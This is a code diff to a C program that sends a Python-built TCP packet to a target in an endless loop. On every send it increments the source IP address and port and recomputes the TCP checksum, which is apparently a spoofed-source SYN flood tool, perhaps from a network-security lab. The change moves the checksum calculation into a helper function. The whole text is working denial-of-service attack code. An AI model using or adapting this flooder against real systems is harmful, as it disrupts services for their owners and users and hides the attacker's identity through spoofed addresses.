@@ -43,6 +43,18 @@ uint16_t chksum(const uint16_t *ptr, int len){
     return(answer);
 }
 
+uint16_t tcpCS(const struct iphdr *iph, const struct tcphdr *tcph, uint16_t tcp_len){
+    struct pseudo_hdr psh;
+    psh.src_ip = iph->saddr;
+    psh.dst_ip = iph->daddr;
+    psh.reserved = 0;
+    psh.protocol = IPPROTO_TCP;
+    psh.tcp_len = htons(tcp_len);
+
+    memcpy(&psh.tcph, tcph, sizeof(struct tcphdr));
+    return (chksum((uint16_t *)&psh, sizeof(struct pseudo_hdr)));
+}
+
 int main(void){
     //Read packet created by Python
     FILE *f = fopen("packet", "rb");
@@ -69,35 +81,25 @@ int main(void){
 
     //Define a new packet based on python created packet
     char *packet = fbuf;
-    char src_ip[32];
 
     //Define headers
     struct iphdr *iph = (struct iphdr*) packet;
     struct tcphdr *tcph = (struct tcphdr*) (packet + sizeof(struct ip));
     struct sockaddr_in sin;
-    struct pseudo_hdr psh;
     
     //Setting up socket
     sin.sin_family = AF_INET;
     sin.sin_port = tcph->dest;
     sin.sin_addr.s_addr = inet_addr(target);
 
-    //Fill TCP Pseudo header
-    psh.src_ip = iph->saddr;
-    psh.dst_ip = iph->daddr;
-    psh.reserved = 0;
-    psh.protocol = IPPROTO_TCP;
-    psh.tcp_len = htons(20);
-
     while(1){
         //Increase the source ip and port
-        tcph->check = 0;
         iph->saddr = iph->saddr + 1;
         tcph->source = tcph->source + 1;
-        psh.src_ip = iph->saddr;
+        //Zero the checksum for packet reuse
+        tcph->check = 0;
         //Calculate the updated checksum for TCP
-        memcpy(&psh.tcph, tcph, sizeof(struct tcphdr));
-        tcph->check = chksum((uint16_t *)&psh, sizeof(struct pseudo_hdr));
+        tcph->check = tcpCS(iph, tcph, 20);
 
         //Send out the packet
         if(sendto(sock, packet, flen, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0){
